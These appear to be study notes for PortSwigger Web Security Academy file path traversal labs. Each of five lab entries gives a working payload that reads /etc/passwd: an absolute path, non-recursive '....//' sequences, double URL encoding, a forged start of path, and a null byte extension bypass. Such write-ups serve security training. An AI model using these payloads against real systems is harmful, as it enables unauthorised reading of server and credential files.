## Approach

1. Look for any param that's accepting a file
2. Use ***Burp Scanner***
## Labs
### [1. File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

> [!NOTE] 
> File path traversal allowing access to `/etc/passwd` with absolute path accepted

**Path traversal payload**

> Getting `/etc/passwd` via absolute path bypass
```
?filename=/etc/passwd
```

### [2. File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

> [!NOTE] 
> A **file path traversal** allowing access to `/etc/passwd` with traversal sequences `../` not stripped recursively allowing bypass  

**Path traversal payload**

> No recursive stripping allowing bypass like the following 
```
?filename=....//....//....//....//....//....//....//etc/passwd
```

### [3. File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

> [!NOTE] 
> Path traversal with double URL encoding bypass

**File path traversal**

> It's possible to bypass the filter by double URL encoding
```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

> Plain
```
?filename=../../../../../../../../../../etc/passwd
```

### [4. File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

> [!NOTE] 
> File path traversal possible because server only validates the start of the path

**File path traversal**

> The server just check if the starting folder is right
```
?filename=/var/www/images/../../../../../../../../etc/passwd
```

### [5. File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
> [!NOTE] 
> Path traversal possible due null byte bypass allowing circumvention of file checking

**File path traversal**

> We can supply a null byte allowing termination and bypass for file checking
```
?filename=../../../../etc/passwd%0020.jpg
```